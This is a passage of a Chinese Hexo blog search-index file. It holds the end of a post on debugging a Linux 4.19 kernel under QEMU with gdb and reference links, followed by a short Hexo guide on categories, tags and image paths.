-gdb tcp::1234 表示监听 1234 端口，用于 gdb 连接</span><br><span class="hljs-meta"># -S 表示加载后立即暂停，等待调试指令。不设置这个选项内核会直接执行</span><br><span class="hljs-meta"># -nographic 以及后续的指令用于将输出重新向到当前的终端中，这样就能方便的用滚屏查看内核的输出日志了。</span><br></code></pre></td></tr></table></figure><h2 id="GDB-调试"><a href="#GDB-调试" class="headerlink" title="GDB 调试"></a>GDB 调试</h2><p>在使用 <code>qemu-system-x86_64</code> 命令启动内核以后，进入到我们从编译机器上拷贝过来的 Linux 内核源代码目录中，在另外一个终端我们来启动 gdb 命令：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cmake">[linux-<span class="hljs-number">4.19</span>.<span class="hljs-number">172</span>]$ gdb <br>(gdb) <span class="hljs-keyword">file</span> vmlinux           <span class="hljs-comment"># vmlinux 位于目录 linux-4.19.172 中</span><br>(gdb) <span class="hljs-keyword">target</span> remote :<span class="hljs-number">1234</span><br>(gdb) <span class="hljs-keyword">break</span> start_kernel     <span class="hljs-comment"># 有些文档建议使用 hb 硬件断点，我在本地测试使用 break 也是 ok 的</span><br>(gdb) c    <span class="hljs-comment"># 启动调试，则内核会停止在 start_kernel 函数处</span><br></code></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://de4dcr0w.github.io/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AALinux%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83.html">https://de4dcr0w.github.io/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AALinux%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83.html</a></p><p><a href="https://blog.csdn.net/scarecrow_byr/article/details/17741133">https://blog.csdn.net/scarecrow_byr/article/details/17741133</a></p><p><a href="https://github.com/google/syzkaller/blob/master/docs/linux/setup_ubuntu-host_qemu-vm_x86-64-kernel.md">https://github.com/google/syzkaller/blob/master/docs/linux/setup_ubuntu-host_qemu-vm_x86-64-kernel.md</a></p><p><a href="https://www.ebpf.top/post/qemu_gdb_busybox_debug_kernel/">https://www.ebpf.top/post/qemu_gdb_busybox_debug_kernel/</a></p><p><a href="https://imkira.com/QEMU-GDB-Linux-Kernel/">https://imkira.com/QEMU-GDB-Linux-Kernel/</a></p><p><a href="http://staff.ustc.edu.cn/~ykli/os2021/lab/lab1.pdf">http://staff.ustc.edu.cn/~ykli/os2021/lab/lab1.pdf</a></p>]]></content>
    
    
    <categories>
      
      <category>LinuxKernel</category>
      
    </categories>
    
    
    <tags>
      
      <tag>LinuxKernel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hexo guide</title>
    <link href="/2021/10/24/hexo_guide/"/>
    <url>/2021/10/24/hexo_guide/</url>
    
    <content type="html"><![CDATA[<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://hexo.io/zh-cn/docs/github-pages">将 Hexo 部署到 GitHub Pages</a></p><p><a href="https://hexo.io/zh-cn/docs/">https://hexo.io/zh-cn/docs/</a></p><p><a href="https://fuhailin.github.io/Hexo-images/">https://fuhailin.github.io/Hexo-images/</a></p><h2 id="分类和标签"><a href="#分类和标签" class="headerlink" title="分类和标签"></a>分类和标签</h2><p> Front-matter 中设置</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs subunit">categories:<br>- Diary<br><span class="hljs-keyword">tags:</span><br>- PS3<br>- Games<br></code></pre></td></tr></table></figure><h2 id="插入图片"><a href="#插入图片" class="headerlink" title="插入图片"></a>插入图片</h2><h3 id="绝对路径本地引用"><a href="#绝对路径本地引用" class="headerlink" title="绝对路径本地引用"></a>绝对路径本地引用</h3><p>当Hexo项目中只用到少量图片时，可以将图片统一放在source/images文件夹中，通过markdown语法访问它们。</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">![](<span class="hljs-regexp">/images/im</span>age.jpg)<br></code></pre></td></tr></table></figure><p>图片既可以在首页内容中访问到，也可以在文章正文中访问到。</p><h3 id="相对路径本地引用"><a href="#相对路径本地引用" class="headerlink" title="相对路径本地引用"></a>相对路径本地引用</h3><p>图片除了可以放在统一的images文件夹中，还可以放在文章自己的目录中。文章的目录可以通过站点配置文件_config.yml来生成。<br><code>post_asset_folder: true</code><br>将_config.yml文件中的配置项post_asset_folder设为true后，执行命令$ hexo new post_name，在source/_posts中会生成文章post_name.md和同名文件夹post_name。将图片资源放在post_name中，文章就可以使用相对路径引用图片资源了。</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less">!<span class="hljs-selector-attr">[]</span>(image.jpg)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
